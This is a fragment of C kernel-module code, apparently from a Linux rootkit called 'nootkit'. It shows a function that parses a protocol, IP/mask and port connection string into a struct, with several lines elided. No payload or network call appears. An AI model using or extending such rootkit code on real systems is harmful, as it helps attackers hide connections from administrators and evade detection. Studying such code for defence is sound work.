...
int config_parse_connection(char *cs, struct config_connection *res) {
    ...
    int local_port = 0, foreign_port = 0;
    int proto = 0;
    int matches = 0;

    #define CONNECTION_STR_FIELDS 19
    matches = sscanf(cs, "PROTO=%d|LOCAL=%d.%d.%d.%d/%d.%d.%d.%d:%d|FOREIGN=%d.%d.%d.%d/%d.%d.%d.%d:%d",
        &proto,
    ...
    if (matches != CONNECTION_STR_FIELDS) {
        printk(KERN_ERR "nootkit: Invalid connection string [%s], only %d fields match the format",
            cs, matches);
        return 1;
    }

    res->proto = proto;
    res->local_ip = local_ip_d + (local_ip_c << 8) + (local_ip_b << 16) + (local_ip_a << 24);
    res->local_ip_mask = local_mask_d + (local_mask_c << 8) + (local_mask_b << 16) + (local_mask_a << 24);
    res->foreign_ip = foreign_ip_d + (foreign_ip_c << 8) + (foreign_ip_b << 16) + (foreign_ip_a << 24);
    res->foreign_ip_mask = foreign_mask_d + (foreign_mask_c << 8) + (foreign_mask_b << 16) + (foreign_mask_a << 24);
    res->local_port = (u16)local_port;
    res->foreign_port = (u16)foreign_port;
